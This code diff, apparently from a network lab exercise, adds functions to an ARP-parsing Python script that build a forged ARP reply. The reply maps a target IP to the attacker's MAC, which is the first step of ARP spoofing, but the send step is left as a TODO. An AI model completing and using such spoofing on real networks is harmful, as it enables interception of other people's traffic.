@@ -137,6 +137,73 @@ def parse_arp_packet(packet, addr):
     print(f"  Interface: {addr[0] if addr else 'unknown'}")
 
 
+from getmac import get_mac_address as gma
+import binascii
+
+IP_SOURCE  = '1.1.1.10'
+MAC_SOURCE = '02:42:01:01:01:0a'
+IP_TARGET  = '1.1.1.20'
+MAC_TARGET = '02:42:01:01:01:14'
+MAC_ATTACKER = gma()
+
+def create_eth_header():
+    h_dest = binascii.unhexlify(MAC_ATTACKER.replace(':', ''))
+    h_source = binascii.unhexlify(MAC_SOURCE.replace(':', ''))
+    h_proto = ETH_TYPE
+    eth_header = struct.pack(
+        '!6s6sH',
+        h_dest, h_source, h_proto
+    )
+    print(eth_header)
+    return eth_header
+
+ETH_ALEN        = 6 # Octets in one ethernet addr
+
+# These are the defined Ethernet Protocol ID's.
+ETH_P_IP        = 0x0800 # Internet Protocol packets
+
+# ARP protocol HARDWARE identifiers
+ARPHRD_ETHER    = 1 # Ethernet 10Mbps
+
+# ARP protocol opcodes.
+ARPOP_REQUEST   = 1
+ARPOP_REPLY     = 2
+ARPOP_RREQUEST  = 3
+ARPOP_RREPLY    = 4
+ARPOP_INREQUEST = 8
+ARPOP_INREPLY   = 9
+ARPOP_NAK       = 10
+
+def create_arp_packet():
+    # ARP HEADER
+    ar_hrd = socket.htons(ARPHRD_ETHER)
+    ar_pro = socket.htons(ETH_P_IP)
+    ar_hln = ETH_ALEN
+    ar_pln = 4
+    ar_op  = socket.htons(ARPOP_REPLY)
+
+    # ARP DATA
+    ar_sha = binascii.unhexlify(MAC_ATTACKER.replace(':', ''))
+    ar_sip = socket.inet_aton(IP_TARGET)
+    ar_tha = binascii.unhexlify(MAC_SOURCE.replace(':', ''))
+    ar_tip = socket.inet_aton(IP_SOURCE)
+
+    arp_packet = struct.pack(
+        '!HHBBH6s4s6s4s',
+        ar_hrd, ar_pro, ar_hln, ar_pln, ar_op,
+        ar_sha, ar_sip,
+        ar_tha, ar_tip
+    )
+    print(arp_packet)
+    return arp_packet
+
+def send_packet():
+    eth_header = create_eth_header()
+    arp_packet = create_arp_packet()
+    full_arp_packet = eth_header + arp_packet
+    # TODO : socket.sendto()
+
+
 def recv_packet(socket):
     while True:
         try:
@@ -153,6 +220,7 @@ def recv_packet(socket):
 if __name__ == "__main__":
     try:
         server_socket = create_server_socket()
+        send_packet()
         recv_packet(server_socket)
     except KeyboardInterrupt:
         print("keyboard interrupt")
